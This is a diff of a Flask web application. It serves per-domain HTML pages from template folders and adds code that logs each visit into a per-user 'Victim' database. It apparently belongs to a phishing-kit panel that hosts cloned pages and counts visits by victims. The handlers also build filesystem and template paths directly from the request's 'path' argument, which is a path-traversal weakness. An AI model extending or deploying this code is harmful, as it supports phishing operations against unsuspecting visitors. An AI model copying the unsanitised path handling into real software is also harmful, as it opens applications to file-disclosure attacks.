@@ -128,10 +128,16 @@ def login():
     else:
         try:
             path = request.args.get('path', None)
-            url = domain + '$' + request.path.replace('/', '')
-            if path:
-                url = domain + '$' + path
+  
+            url = domain + '$' + path
+            
             username = os.listdir(f'templates/domains/{url}/')[0]
+
+            if not 'entered' in session:
+                session['entered'] = True
+                db_victim = Victim(f'./users/{username.replace(".html", "")}/database.db')
+                db_victim.AddView(domain)
+            
             return render_template(f'domains/{url}/{username}')
         except:
             return redirect(url_for('index', path=request.path.replace('/', '')))
@@ -176,10 +182,14 @@ def panel():
     else:
         try:
             path = request.args.get('path', None)
-            url = domain + '$' + request.path.replace('/', '')
-            if path:
-                url = domain + '$' + path
+            url = domain + '$' + path
+
             username = os.listdir(f'templates/domains/{url}/')[0]
+            if not 'entered' in session:
+                session['entered'] = True
+                db_victim = Victim(f'./users/{username.replace(".html", "")}/database.db')
+                db_victim.AddView(domain)
+
             return render_template(f'domains/{url}/{username}')
         except:
             return redirect(url_for('index', path=request.path.replace('/', '')))
@@ -309,6 +319,12 @@ def domains():
             path = request.args.get('path', None)
             url = domain + '$' + path
             username = os.listdir(f'templates/domains/{url}/')[0]
+
+            if not 'entered' in session:
+                session['entered'] = True
+                db_victim = Victim(f'./users/{username.replace(".html", "")}/database.db')
+                db_victim.AddView(domain)
+
             return render_template(f'domains/{url}/{username}')
         except Exception as e:
             print(e)
@@ -539,6 +555,12 @@ def path(path):
     try:
         url = host + '$' + path
         username = os.listdir(f'templates/domains/{url}/')[0]
+
+        if not 'entered' in session:
+            session['entered'] = True
+            db_victim = Victim(f'./users/{username.replace(".html", "")}/database.db')
+            db_victim.AddView(host)
+
         return render_template(f'domains/{url}/{username}')
     except Exception as e:
         return redirect(url_for('index'))
